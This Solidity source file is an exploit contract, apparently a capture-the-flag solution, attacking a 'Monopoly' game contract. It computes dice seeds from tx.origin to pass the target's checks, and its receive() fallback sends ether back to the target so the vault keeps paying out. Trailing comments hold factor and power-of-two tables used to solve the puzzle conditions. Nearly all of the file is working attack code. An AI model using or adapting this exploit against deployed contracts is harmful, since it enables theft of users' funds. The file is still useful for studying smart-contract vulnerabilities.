// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "./Monopoly.sol";
import "hardhat/console.sol";

contract Exploit {
    Monopoly instance;
    bytes8 public FACTOR = 0x000000012ACE4C7F;

    constructor(Monopoly _instance) payable {
        instance = _instance;
    }

    function finalize() external payable {
        console.log("BALANCE", address(instance.vault()).balance);

        console.log("MSG SENDER", uint16(bytes2(bytes20(address(msg.sender)))));
        console.log("TX ORIGIN", uint16(bytes2(bytes20(address(tx.origin)))));
        console.log("DICE", uint16(32768));
        console.log(
            "SEED 1",
            uint16(1) ^ uint16(bytes2(bytes20(address(this))))
        );
        console.log(
            "SEED 2",
            uint16(9) ^ uint16(bytes2(bytes20(address(tx.origin))))
        );

        uint16 seed1 = uint16(1) ^ uint16(bytes2(bytes20(address(tx.origin))));
        uint16 seed2 = uint16(9) ^ uint16(bytes2(bytes20(address(tx.origin))));

        console.log("SEED BYTES");
        console.logBytes(abi.encodePacked(seed1));
        console.log("FACTOR", uint64(FACTOR));
        console.log("FACTOR", uint64(FACTOR) % seed1 == 0);

        instance.play{value: 1 ether}(seed1, seed2);

        console.log("BALANCE", address(instance.vault()).balance);
    }

    receive() external payable {
        console.log("ME LLEGO", msg.value);
        if (msg.value < 1 ether) {
            console.log("TRANSFIERO");
            console.log("BALANCE", address(this).balance);
            (bool success, ) = address(instance).call{value: 0.5 ether}("");
            require(success);
        }
    }
}

// FIRST CONDITION 1073741824
// SECOND CONDITION 2147483648
// THIRD CONDITION 3221225472

// 1 , 2 , 4 , 8 , 16 , 32 , 64 , 128 , 256 , 512 , 1024 , 2048 , 4096 , 8192 , 16384 , 32768 , 65536 , 131072 , 262144 , 524288 , 1048576 , 2097152 , 4194304 , 8388608 , 16777216 , 33554432 , 67108864 , 134217728 , 268435456 , 536870912 , 1073741824 ,
// 1 , 2 , 4 , 8 , 16 , 32 , 64 , 128 , 256 , 512 , 1024 , 2048 , 4096 , 8192 , 16384 , 32768 , 65536 , 131072 , 262144 , 524288 , 1048576 , 2097152 , 4194304 , 8388608 , 16777216 , 33554432 , 67108864 , 134217728 , 268435456 , 536870912 , 1073741824 , 2147483648
// 1 , 2 , 3 , 4 , 6 , 8 , 12 , 16 , 24 , 32 , 48 , 64 , 96 , 128 , 192 , 256 , 384 , 512 , 768 , 1024 , 1536 , 2048 , 3072 , 4096 , 6144 , 8192 , 12288 , 16384 , 24576 , 32768 , 49152 , 65536 , 98304 , 131072 , 196608 , 262144 , 393216 , 524288 , 786432 , 1048576 , 1572864 , 2097152 , 3145728 , 4194304 , 6291456 , 8388608 , 12582912 , 16777216 , 25165824 , 33554432 , 50331648 , 67108864 , 100663296 , 134217728 , 201326592 , 268435456 , 402653184 , 536870912 , 805306368 , 1073741824 , 1610612736 , 3221225472 ,

// 1 , 2 , 3 , 4 , 6 , 7 , 9 , 11 , 12 , 14 , 18 , 21 , 22 , 28 , 31 , 33 , 36 , 42 , 44 , 62 , 63 , 66 , 77 , 84 , 93 , 99 , 124 , 126 , 132 , 151 , 154 , 186 , 198 , 217 , 231 , 252 , 279 , 302 , 308 , 331 , 341 , 372 , 396 , 434 , 453 , 462 , 558 , 604 , 651 , 662 , 682 , 693 , 868 , 906 , 924 , 993 , 1023 , 1057 , 1116 , 1302 , 1324 , 1359 , 1364 , 1386 , 1661 , 1812 , 1953 , 1986 , 2046 , 2114 , 2317 , 2387 , 2604 , 2718 , 2772 , 2979 , 3069 , 3171 , 3322 , 3641 , 3906 , 3972 , 4092 , 4228 , 4634 , 4681 , 4774 , 4983 , 5436 , 5958 , 6138 , 6342 , 6644 , 6951 , 7161 , 7282 , 7812 , 9268 , 9362 , 9513 , 9548 , 9966 , 10261 , 10923 , 11627 , 11916 , 12276 , 12684 , 13902 , 14043 , 14322 , 14564 , 14949 , 18724 , 19026 , 19932 , 20522 , 20853 , 21483 , 21846 , 23254 , 25487 , 27804 , 28086 , 28644 , 29898 , 30783 , 32767 , 32769 , 34881 , 38052 , 41044 , 41706 , 42129 , 42966 , 43692 , 46508 , 49981 , 50974 , 51491 , 56172 , 59796 , 61566 , 65534 , 65538 , 69762 , 71827 , 76461 , 83412 , 84258 , 85932 , 92349 , 98301 , 99962 , 101948 , 102982 , 104643 , 112871 , 123132 , 131068 , 131076 , 139524 , 143654 , 149943 , 152922 , 154473 , 168516 , 184698 , 196602 , 199924 , 205964 , 209286 , 215481 , 225742 , 229383 , 287308 , 294903 , 299886 , 305844 , 308946 , 338613 , 349867 , 360437 , 369396 , 393204 , 418572 , 430962 , 449829 , 451484 , 458766 , 463419 , 549791 , 589806 , 599772 , 617892 , 646443 , 677226 , 699734 , 720874 , 790097 , 861924 , 899658 , 917532 , 926838 , 1015839 , 1049601 , 1081311 , 1099582 , 1179612 , 1292886 , 1354452 , 1399468 , 1441748 , 1549411 , 1580194 , 1649373 , 1799316 , 1853676 , 2031678 , 2099202 , 2162622 , 2199164 , 2370291 , 2585772 , 3098822 , 3148803 , 3160388 , 3243933 , 3298746 , 3848537 , 4063356 , 4198404 , 4325244 , 4648233 , 4740582 , 4948119 , 6197644 , 6297606 , 6487866 , 6597492 , 7110873 , 7697074 , 9296466 , 9481164 , 9896238 , 10845877 , 11545611 , 12595212 , 12975732 , 13944699 , 14221746 , 15394148 , 17043521 , 18592932 , 19792476 , 21691754 , 23091222 , 27889398 , 28443492 , 32537631 , 34087042 , 34636833 , 43383508 , 46182444 , 51130563 , 55778796 , 65075262 , 68174084 , 69273666 , 97612893 , 102261126 , 119304647 , 130150524 , 138547332 , 153391689 , 195225786 , 204522252 , 238609294 , 306783378 , 357913941 , 390451572 , 477218588 , 613566756 , 715827882 , 1073741823 , 1431655764 , 2147483646 , 4294967292

// 1 , 7 , 49 , 102308783 , 716161481 , 5013130367 ,
